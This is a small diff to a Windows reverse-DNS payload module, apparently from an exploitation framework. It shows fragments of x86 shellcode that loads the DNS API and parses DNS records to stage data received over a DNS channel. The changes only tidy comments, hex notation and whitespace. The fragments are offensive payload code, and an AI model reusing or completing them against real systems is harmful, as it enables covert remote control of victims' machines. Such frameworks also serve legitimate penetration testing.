@@ -102,7 +102,7 @@ module Payload::Windows::ReverseDns
     
     asm = %Q^
       ; Input: EBP must be the address of 'api_call'.
-         ;int 3
+         
          ;;;;;;;;; Load DNS API lib ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
          push        'pi'               ; Push the bytes 'Dnsapi',0,0 onto the stack.
          push        'Dnsa'             ; ...
@@ -250,7 +250,7 @@ module Payload::Windows::ReverseDns
          mov         eax, [esp + 0x18]         
          add         eax, 0x18
          je          parse_end_b
-         sub         eax, 18h
+         sub         eax, 0x18
          push        eax
          mov         esi, esp              ; pointer to DNS_RECORD
          mov         [esi], eax            ; ESI < -pointer to DNS_RECORD
@@ -290,7 +290,7 @@ module Payload::Windows::ReverseDns
          mov         eax, esp
          mov         byte ptr[eax + 0x30], '0'          ; switch to data mode
 
-         ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;     RESET COUNTER
+         ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;    RESET COUNTER
          mov         dword ptr[esp + 0x0c], 50
          ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;    GET MEM
          mov         eax, [esp + 0x20]           ; get size, that  we just recieved
@@ -319,9 +319,9 @@ module Payload::Windows::ReverseDns
          jne         parse_end_db2
 
          mov         eax, [esp + 0x18]
-         add         eax, 18h
+         add         eax, 0x18
          je          parse_end_db
-         sub         eax, 18h
+         sub         eax, 0x18
          push        eax                  ; ESI <-pointer to DNS_RECORD
          mov         eax, [esp + 0x20]
          push        eax                  ; save current offset
